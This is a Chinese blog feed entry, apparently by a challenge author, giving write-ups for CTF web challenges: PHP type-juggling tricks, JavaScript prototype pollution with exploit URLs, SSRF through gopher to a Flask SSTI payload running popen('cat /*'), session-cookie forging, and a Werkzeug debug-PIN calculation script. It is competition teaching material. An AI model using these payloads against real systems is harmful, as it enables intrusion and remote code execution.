<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>光辉的blog啦~~</title>
  
  
  <link href="https://1llustrious.github.io/atom.xml" rel="self"/>
  
  <link href="https://1llustrious.github.io/"/>
  <updated>2023-12-09T02:30:13.535Z</updated>
  <id>https://1llustrious.github.io/</id>
  
  <author>
    <name>1llustrious</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PCTF小记</title>
    <link href="https://1llustrious.github.io/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/"/>
    <id>https://1llustrious.github.io/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/</id>
    <published>2023-12-08T16:00:21.000Z</published>
    <updated>2023-12-09T02:30:13.535Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="写在前面"><span id="写在前面"> 写在前面</span></h1><p>nmd 新生赛一堆老东西来💥🐟是吧.</p><p>👴本来出了三道题，但是有道题因为名字写错了，导致没上成，👴真 tm 是个 sb,👴自认为题目出的简单了，以下细说.</p><h1 id="废案之-easy_php"><span id="废案之-easy_php"> 废案之 easy_php</span></h1><p>👴tm 本来投题写的是 easy_php, 结果在出题文档写了 ez_php,Xenny 老师没给我上，不过没啥事，毕竟这题太简单了.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$param1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;param1&#x27;</span>];</span><br><span class="line"><span class="variable">$param2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$param2</span>!==<span class="variable">$param1</span>&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$param2</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$param1</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;太好了,你绕过了最简单的一层&lt;br/&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$num</span>)&lt;=<span class="number">3</span> &amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>)&gt;<span class="number">999999999</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;恭喜你进来了,继续吧&lt;br/&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$kanozyo</span> = <span class="string">&quot;katoumegumi&quot;</span>;</span><br><span class="line">        <span class="variable">$kami</span> = <span class="string">&quot;enterprise&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTsgPz4=&quot;</span>);</span><br><span class="line">        <span class="variable">$file</span> = <span class="string">&quot;new_file.php&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$kanozyo</span>===<span class="string">&quot;lishanweilai&quot;</span>&amp;&amp;<span class="variable">$kami</span> === <span class="string">&quot;korey0sh1&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="string">&quot;&lt;?php die();&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;太可惜了,我并不是神,我的老婆可是栗山未来&lt;br/&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;不够大,太长了&lt;br/&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;这么简单的md5都不会绕?&lt;br/&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反正 php 特性的总结，太简单了，👴不想写 wp 了</p><h1 id="成神之日"><span id="成神之日"> 成神之日</span></h1><p>同样简单的 js, 我以为很多老东西能解出来，没想到只有两个，还有一个是 tm 问我思路的.</p><p>源码给你了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> list = &#123;</span><br><span class="line">    <span class="string">&#x27;PWN&#x27;</span>:<span class="string">&#x27;korey0sh1&#x27;</span>,<span class="string">&#x27;WEB1&#x27;</span>:<span class="string">&#x27;welk1n&#x27;</span>,<span class="string">&#x27;WEB2&#x27;</span>:<span class="string">&#x27;zymic&#x27;</span>,<span class="string">&#x27;MISC&#x27;</span>:<span class="string">&quot;Cat_zn&quot;</span>,<span class="string">&#x27;CRYPTO&#x27;</span>:<span class="string">&#x27;Big_Dick&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> flag = process.<span class="property">env</span>.<span class="property">FLAG</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">generateRandomNumber</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> randomBytes = crypto.<span class="title function_">randomBytes</span>(<span class="number">4</span>); </span><br><span class="line">    <span class="keyword">const</span> randomNumber = randomBytes.<span class="title function_">readUInt32LE</span>(<span class="number">0</span>); </span><br><span class="line">    <span class="keyword">return</span> randomNumber;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> admin_token = <span class="title function_">generateRandomNumber</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">hash</span> = (<span class="params">token</span>) =&gt; crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;md5&#x27;</span>).<span class="title function_">update</span>(token).<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>);<span class="comment">//简单的md5加密捏</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&quot;/index.html&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/src&#x27;</span>, <span class="function">(<span class="params">_, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(__filename);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/api/add&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; x, y, namae &#125; = req.<span class="property">query</span>;</span><br><span class="line">    <span class="keyword">if</span> (x &amp;&amp; y &amp;&amp; namae) list[x][y] = namae;</span><br><span class="line">    res.<span class="title function_">json</span>(list);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> userData = &#123;&#125;;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">cookies</span> &amp;&amp; req.<span class="property">cookies</span>.<span class="property">admin</span> === <span class="literal">true</span>) &#123;</span><br><span class="line">        userData.<span class="property">admin</span> = <span class="literal">true</span></span><br><span class="line">        userData.<span class="property">token</span> = admin_token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (userData.<span class="property">admin</span> &amp;&amp; req.<span class="property">query</span>.<span class="property">token</span></span><br><span class="line">        &amp;&amp; <span class="title function_">hash</span>(<span class="string">`Korey0sh1_love_you<span class="subst">$&#123;req.query.token&#125;</span>zymic_1s_god`</span>) === userData.<span class="property">token</span>) &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(flag);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="string">&quot;0.0.0.0&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>很明显 flag 是需要条件的，需要 <code>userData.admin</code>  为 <code>true</code> , 且和字符串拼接后 <code>md5</code>  加密的值与 <code>userData.token</code>  相同.</p><p>看到这里，有师傅想着通过 cookies 进入 if, 使得 userData.admin 为 true, 恭喜你，你需要重启靶机了🤣.</p><h2 id="正解如下"><span id="正解如下"> 正解如下</span></h2><h3 id="原型链污染"><span id="原型链污染"> 原型链污染</span></h3><p>这段路由可控变量太多了，js 有个东西叫做原型链污染，简单来说就是每个对象默认有个属性 <code>Prototype</code>  指向对象的原型，并且对象的原型也是原型.</p><p>大部分正常对象的原型是 <code>Object</code> . 可以认为 <code>Object</code>  是所有类的父类， <code>Object</code>  也有自己的原型，就是 <code>NULL</code> , <code>Object</code>  的构造函数指向 <code>Function</code> .</p><p><code>Function</code>  是用于创造函数对象的，在 js, 函数也可以看作对象，不过这里就不细讲了.</p><p>然后一个对象可以通过访问其 <code>__proto__</code> 去获取它的原型对象.</p><p>js 有个特性，那就是如果访问一个属性，这个属性该对象不具备的话，并不会直接返回 undefined, 而是会顺着其原型链一级一级往上找，类似于子类找不到的属性从父类找，但是 JS 可以找到向上找 Object, 然后到 <code>NULL</code> , 都没有的话，就会返回 undefined.</p><p>注意：如果要原型链污染，一定需要该对象没有某个属性的值，如果该对象某个属性的值存在，就会直接返回.</p><p>所以我说之前靠 cookies 的师傅，恭喜你们掉进坑里了，想要做出来还是得重启靶机了.😊🤣</p><p>如果两个对象共享一个原型，通过其中一个对象改变了原型的属性，那么也会影响另一个对象的原型.</p><h3 id="题目实现"><span id="题目实现"> 题目实现</span></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/api/add&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; x, y, namae &#125; = req.<span class="property">query</span>;</span><br><span class="line">    <span class="keyword">if</span> (x &amp;&amp; y &amp;&amp; namae) list[x][y] = namae;</span><br><span class="line">    res.<span class="title function_">json</span>(list);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>大部分题目都会去污染 <code>Object</code> , 毕竟 Object 基本上是所有对象都会有的原型.</p><p>这里 <code>x</code> , <code>y</code> , <code>namae</code>  都可控，直接改原型就行了.</p><p>这里就可以将 <code>admin</code>  改成 <code>true</code> , 但是还不够，还要将 token 改成我们想要的任意值，污染 userdata 的原型，影响其 token 的返回值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/api/add?x=__proto__&amp;y=admin&amp;namae=<span class="number">1</span></span><br><span class="line">/api/add?x=__proto__&amp;y=token&amp;namae=33e981e155eb62f5646de98c23e0ce02</span><br><span class="line">/flag?token=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>这么打就能满足条件了.</p><h1 id="double_ss-之正解"><span id="double_ss-之正解"> Double_SS 之正解</span></h1><p>这道题本来是想整个 SSRF 触发 SSTI 的，然后测试的时候不断修改，先是 file 协议直接读 flag 的非预期，气得👴直接将 flag 改成 400 权限了，然后 python 服务用 root 开启，这样子只能通过 python 去读👴的 flag,👴真 tm 是个天才.</p><p>不过👴并没有 ban 各种协议，这就导致我后面发现了一个非预期，不过这个非预期比预期复杂程度高多了，当然我后面也会写，想学的师傅可以看看.</p><h2 id="源码鉴赏一波"><span id="源码鉴赏一波"> 源码鉴赏一波</span></h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="title function_">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_">highlight_file</span>(__FILE__);</span><br><span class="line">$url=$_POST[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">$ch=<span class="title function_">curl_init</span>($url);</span><br><span class="line"><span class="title function_">curl_setopt</span>($ch, <span class="variable constant_">CURLOPT_HEADER</span>, <span class="number">0</span>);</span><br><span class="line"><span class="title function_">curl_setopt</span>($ch, <span class="variable constant_">CURLOPT_RETURNTRANSFER</span>, <span class="number">1</span>);</span><br><span class="line">$result=<span class="title function_">curl_exec</span>($ch);</span><br><span class="line"><span class="title function_">curl_close</span>($ch);</span><br><span class="line">echo ($result);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//try to access 5555 port</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>回到正题，上来就是 php 源码，很明显打个 SSRF,👴还贴心地告诉你找 5555 端口 (其实是👴忘了有 file 协议这玩意可以读源码，不然👴把这个 hint 给你 ban 了，难死你们几个 byd)</p><p>然后打过去，发现有回显，很明显是个 flask,👴甚至还告诉你 <code>secretkey</code> , 够仁慈了吧.</p><p>不然👴直接让你读内存拿 key.</p><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/1702047781163-1702087704091-1.png" alt="1702047781163"></p><p>👴还告诉你怎么 SSTI 了，那么就很简单了.</p><p>不懂 SSTI 的自行上网搜，网上大把文章，👴的 waf 也只是象征性地写一下，绕一下很容易的.</p><p>这里还涉及到 flasksession 伪造的.</p><h2 id="flasksession-伪造"><span id="flasksession-伪造"> flasksession 伪造</span></h2><h3 id="直接上脚本"><span id="直接上脚本"> 直接上脚本</span></h3><p>脚本网上很多，其中比较常用的是</p><p><a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p><p>用法也有，简单展示一下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.<span class="property">py</span> encode -s <span class="string">&quot;76bcf327-fd33-44f3-98eb-530a7351ea1d&quot;</span> -t <span class="string">&quot;&#123;&#x27;admin&#x27;:1&#125;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/1702048442240-1702087704091-2.png" alt="1702048442240"></p><h3 id="本地生成"><span id="本地生成"> 本地生成</span></h3><p>这个更简单了，这种思维应对很多题目都非常有用.</p><p>👴没 banfile 协议，直接读源码都行<img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/1702048496042-1702087704091-3.png" alt="1702048496042"></p><p>理论上自己写个 flask, 设置一下 key 访问都行，实在不会，把源码放在本地里跑，key 一换就行了</p><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/1702049073350-1702087704091-4.png" alt="1702049073350"></p><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/1702049061471-1702087704091-5.png" alt="1702049061471"></p><h2 id="gopher-协议"><span id="gopher-协议"> gopher 协议</span></h2><p>session 搞定了，但是最终还有个问题，就是直接去请求只能携带 get 参数，不能携带 cookie.</p><p>于是这时候就需要用的 <code>gopher</code>  协议了，简单来说，就是可以通过一种特殊的形式，传递完整的数据包，包括携带 headers,post 传参之类的.</p><p>形式如下:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">gopher</span>:<span class="comment">//127.0.0.1&lt;:port爱写不写&gt;/_&lt;二次url编码过后的整个报文&gt;</span></span><br></pre></td></tr></table></figure><p>于是使用 python 的 <code>+urllib.parse</code>  制造一个脚本如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.<span class="property">parse</span></span><br><span class="line">test2 =\</span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;GET /name?name=%7B%7B%22%22%5B%22__c%22%22lass__%22%5D%5B%22__b%22%22ases__%22%5D%5B0%5D%5B%22__subcl%22%22asses__%22%5D()%5B133%5D%5B%22__in%22%22it__%22%5D%5B%22__gl%22%22obals__%22%5D%5B&#x27;po&#x27;&#x27;pen&#x27;%5D(&#x27;ca&#x27;&#x27;t%20%2F*&#x27;).read()%7D%7D HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1:5555</span></span><br><span class="line"><span class="string">Cookie: session=eyJhZG1pbiI6MX0.ZXM1Hw.3T3ehyY4yIAG3x107z5UT3hKTD4</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">tmp = urllib.<span class="property">parse</span>.<span class="title function_">quote</span>(test2)</span><br><span class="line"><span class="keyword">new</span> = tmp.<span class="title function_">replace</span>(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:5555/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+urllib.<span class="property">parse</span>.<span class="title function_">quote</span>(<span class="keyword">new</span>)</span><br><span class="line"><span class="title function_">print</span>(result)</span><br></pre></td></tr></table></figure><p>不过由于 python 多行引用是只有单换行，而报文结尾是 <code>\r\n</code> , 所以需要替换一下.</p><p>最后 ssti 如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>[<span class="string">&quot;__c&quot;</span><span class="string">&quot;lass__&quot;</span>][<span class="string">&quot;__b&quot;</span><span class="string">&quot;ases__&quot;</span>][<span class="number">0</span>][<span class="string">&quot;__subcl&quot;</span><span class="string">&quot;asses__&quot;</span>]()[<span class="number">133</span>][<span class="string">&quot;__in&quot;</span><span class="string">&quot;it__&quot;</span>][<span class="string">&quot;__gl&quot;</span><span class="string">&quot;obals__&quot;</span>][<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;ca&#x27;</span><span class="string">&#x27;t /*&#x27;</span>).<span class="title function_">read</span>()&#125;&#125;</span><br></pre></td></tr></table></figure><p>简单的中括号获取属性，字符串拼接，没啥好说的</p><p>记得 url 编码后放在报文里面.</p><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/1702049519480-1702087704091-6.png" alt="1702049519480"></p><p>比较简单</p><h1 id="double_ss-之非预期"><span id="double_ss-之非预期"> Double_SS 之非预期</span></h1><p>由于👴代码是缝缝补补出来的，忘记关 debug, 于是就是有非预期，而且咋就那么巧呢，还可以通过 file 协议读文件.</p><p>但是 SSRF 利用 console 有一定难度，各位师傅看看就好.</p><h2 id="算-pin-码"><span id="算-pin-码"> 算 pin 码</span></h2><p>debug 模式开了之后，访问 console 会出现一个输入 pin 码的地方，输入正确的 pin, 就能进去执行任意 python 代码，不过 pin 码是有算法逻辑的.</p><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/1702049670007-1702087704091-7.png" alt="1702049670007"></p><p>具体来说脚本如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">        <span class="string">&quot;root&quot;</span>,#/etc/passwd</span><br><span class="line">        <span class="string">&quot;flask.app&quot;</span>,#默认</span><br><span class="line">        <span class="string">&quot;Flask&quot;</span>,#默认</span><br><span class="line">        <span class="string">&#x27;/usr/local/lib/python3.9/dist-packages/flask/app.py&#x27;</span> ,#一个路径信息</span><br><span class="line">    ]</span><br><span class="line">addr = <span class="string">&quot;02:42:ac:02:1d:64&quot;</span></span><br><span class="line">boot_id = <span class="string">&quot;fcf66b92-efb4-40db-b14b-952a04033668&quot;</span></span><br><span class="line">cgroup = <span class="string">&quot;4184c5b8cc23b91413e5c41e35a5c66ea81cc007e0cc3ed46d5c55bf2d3e3524&quot;</span></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="title function_">str</span>(<span class="title function_">int</span>(<span class="string">&quot;0x&quot;</span>+addr.<span class="title function_">replace</span>(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;&quot;</span>),<span class="number">16</span>)), #/sys/<span class="keyword">class</span>/net/eth0/address 十六进制转十进制</span><br><span class="line">       boot_id+cgroup</span><br><span class="line">]#读取/proc/sys/kernel/random/boot_id和/proc/self/cgroup拼接而成</span><br><span class="line">h = hashlib.<span class="title function_">sha1</span>()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> <span class="title function_">chain</span>(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> not <span class="attr">bit</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">isinstance</span>(bit, str):</span><br><span class="line">        bit = bit.<span class="title function_">encode</span>(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    h.<span class="title function_">update</span>(bit)</span><br><span class="line">h.<span class="title function_">update</span>(b<span class="string">&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = f<span class="string">&quot;__wzd&#123;h.hexdigest()[:20]&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"># <span class="title class_">If</span> we need to generate a pin we salt it a bit more so that we don<span class="string">&#x27;t</span></span><br><span class="line"><span class="string"># end up with the same value and generate out 9 digits</span></span><br><span class="line"><span class="string">num = None</span></span><br><span class="line"><span class="string">if num is None:</span></span><br><span class="line"><span class="string">    h.update(b&quot;pinsalt&quot;)</span></span><br><span class="line"><span class="string">    num = f&quot;&#123;int(h.hexdigest(), 16):09d&#125;&quot;[:9]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line"><span class="string"># we don&#x27;</span>t have a result yet.</span><br><span class="line">rv = <span class="title class_">None</span></span><br><span class="line"><span class="keyword">if</span> rv is <span class="title class_">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&quot;-&quot;</span>.<span class="title function_">join</span>(</span><br><span class="line">                num[<span class="attr">x</span>: x + group_size].<span class="title function_">rjust</span>(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">0</span>, <span class="title function_">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="attr">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(rv)</span><br><span class="line"><span class="title function_">print</span>(cookie_name)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这么长也不用害怕，因为都是从库的源码里面翻出来的，我们只是对传入的参数依照题目环境修改</p><p>分为两部分</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">probably_public_bits = [</span><br><span class="line">        <span class="string">&quot;root&quot;</span>,#/etc/passwd</span><br><span class="line">        <span class="string">&quot;flask.app&quot;</span>,#默认</span><br><span class="line">        <span class="string">&quot;Flask&quot;</span>,#默认</span><br><span class="line">        <span class="string">&#x27;/usr/local/lib/python3.9/dist-packages/flask/app.py&#x27;</span> ,#flask的路径,通过报错得到</span><br><span class="line">    ]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第一部分的信息来源</p><p>用户信息：当前用户，由于我是 root 权限开启，直接就是 root, 中间都是默认的</p><p>路径信息直接报错得到</p><p><img 